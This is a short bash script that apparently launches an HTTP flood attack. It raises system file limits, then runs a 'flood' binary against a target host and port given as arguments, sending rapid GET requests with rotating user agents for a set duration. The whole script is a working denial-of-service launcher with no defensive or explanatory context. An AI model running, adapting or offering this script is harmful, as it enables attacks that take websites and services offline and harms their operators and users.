#!/bin/bash
sysctl -w fs.inotify.max_user_watches=1000000;
ulimit -n 1000000;
echo | timeout -s 2 "$2"s /root/flood/flood -h "$1" -p "$3" -u useragents.txt -c "$4" -m GET -t "$2" -r 2000 -n "$5"